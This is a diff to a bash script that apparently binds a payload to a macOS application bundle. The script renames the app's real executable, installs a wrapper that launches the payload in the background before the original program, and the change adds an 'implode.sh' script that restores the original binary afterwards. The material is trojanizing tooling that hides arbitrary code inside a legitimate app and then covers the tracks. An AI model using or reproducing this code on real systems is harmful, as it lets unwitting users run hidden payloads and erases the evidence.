@@ -29,7 +29,9 @@ payload="$1"
 app_root="$2"
 info="$app_root/Contents/Info.plist"
 macos="$app_root/Contents/MacOS"
-binary="$macos/$(/usr/libexec/PlistBuddy "$info" -c "Print :CFBundleExecutable")"
+app_name="$(/usr/libexec/PlistBuddy "$info" -c "Print :CFBundleExecutable")"
+binary="$macos/$app_name"
+implode="$app_root/implode.sh"
 
 logloc "Payload" "$payload"
 logloc "App root" "$app_root"
@@ -54,6 +56,11 @@ binary="$(dirname "${BASH_SOURCE[0]}")/$(basename "$0")"
 
 "${binary}_pl" &
 "${binary}_og"
+EOF
+cat > "$implode" <<EOF
+#!/usr/bin/env bash
+
+mv "Contents/MacOS/${app_name}"{_og,}
 EOF
 log "Making master script and payload executable"
 chmod +x "${binary}_pl" "$binary"
